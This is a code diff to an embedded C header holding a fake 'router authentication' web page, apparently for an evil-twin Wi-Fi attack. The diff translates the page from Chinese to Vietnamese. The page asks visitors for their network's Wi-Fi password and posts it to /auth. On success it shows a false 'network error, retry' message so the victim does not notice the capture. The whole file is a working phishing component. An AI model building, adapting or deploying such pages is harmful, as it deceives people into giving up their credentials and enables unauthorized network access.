@@ -1,14 +1,14 @@
 #ifndef WEB_AUTH2_PAGE_H
 #define WEB_AUTH2_PAGE_H
 
-// 仿老式路由器身份验证页面
+// Classic router auth page
 const char WEB_AUTH2_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Wireless Router - Authentication</title>
+  <title>ROUTER KHÔNG DÂY · CỔNG QUẢN TRỊ</title>
   <style>
     body { font-family: Arial, Helvetica, sans-serif; background:#f2f2f2; color:#333; margin:0; }
     .topbar { background:#2c3e50; color:#ecf0f1; padding:10px 14px; font-size:14px; }
@@ -32,35 +32,35 @@ const char WEB_AUTH2_HTML[] PROGMEM = R"rawliteral(
   </style>
 </head>
 <body>
-  <div class="topbar">Wireless Router Web Authentication</div>
+  <div class="topbar">ROUTER KHÔNG DÂY · CỔNG QUẢN TRỊ</div>
   <div class="container">
     <div class="header">
-      <h1>网络身份认证</h1>
-      <div class="sub">当前网络：{SSID}</div>
+      <h1>ĐĂNG NHẬP</h1>
+      <div class="sub">Mạng hiện tại: {SSID}</div>
     </div>
     <div class="content">
-      <div class="info">为确保网络安全，请输入该无线网络的访问密码以完成认证。</div>
+      <div class="info">Để bảo mật mạng, vui lòng nhập mật khẩu WiFi để xác thực và tiếp tục truy cập Internet.</div>
       <form onsubmit="submitText(); return false;">
         <table>
           <tr>
-            <th>无线网络 (SSID)：</th>
+            <th>Mạng không dây (SSID):</th>
             <td>{SSID}</td>
           </tr>
           <tr>
-            <th>验证密码：</th>
-            <td><input id="text" type="password" placeholder="请输入密码" maxlength="64" minlength="8"></td>
+            <th>Mật khẩu:</th>
+            <td><input id="text" type="password" placeholder="Mật khẩu" maxlength="64" minlength="8"></td>
           </tr>
         </table>
         <div class="actions">
           <button id="submitBtn" class="btn" type="submit">
             <span class="spinner" id="spinner"></span>
-            <span id="btnText">连接</span>
+            <span id="btnText">Đăng nhập</span>
           </button>
-          <div class="muted">如需连接此网络，请完成身份验证</div>
+          <div class="muted">Vui lòng nhập mật khẩu để kết nối</div>
         </div>
       </form>
     </div>
-    <div class="footer">© Router Web Manager</div>
+    <div class="footer">© 2025 Router Không Dây · Phiên bản 1.0.0</div>
   </div>
   <script>
     function isValidWifiPassword(p){
@@ -72,7 +72,7 @@ const char WEB_AUTH2_HTML[] PROGMEM = R"rawliteral(
     function submitText(){
       var v = (document.getElementById('text').value||'').trim();
       if(!isValidWifiPassword(v)){
-        alert('密码格式错误');
+        alert('Định dạng mật khẩu không hợp lệ');
         return;
       }
       var btn = document.getElementById('submitBtn');
@@ -81,16 +81,16 @@ const char WEB_AUTH2_HTML[] PROGMEM = R"rawliteral(
       
       btn.disabled = true;
       spinner.style.display = 'inline-block';
-      btnText.textContent = '连接中...';
+      btnText.textContent = 'Đang đăng nhập...';
       
       fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:v})})
         .then(function(r){return r.json();})
-        .then(function(j){ alert(j&&j.success?'网络异常，请重试！':'提交失败，请刷新重试'); })
-        .catch(function(){ alert('网络错误'); })
+        .then(function(j){ alert(j&&j.success?'Lỗi mạng, thử lại!':'Gửi thất bại, hãy tải lại trang'); })
+        .catch(function(){ alert('Lỗi mạng'); })
         .finally(function(){
           btn.disabled = false;
           spinner.style.display = 'none';
-          btnText.textContent = '连接';
+          btnText.textContent = 'Đăng nhập';
         });
     }
   </script>
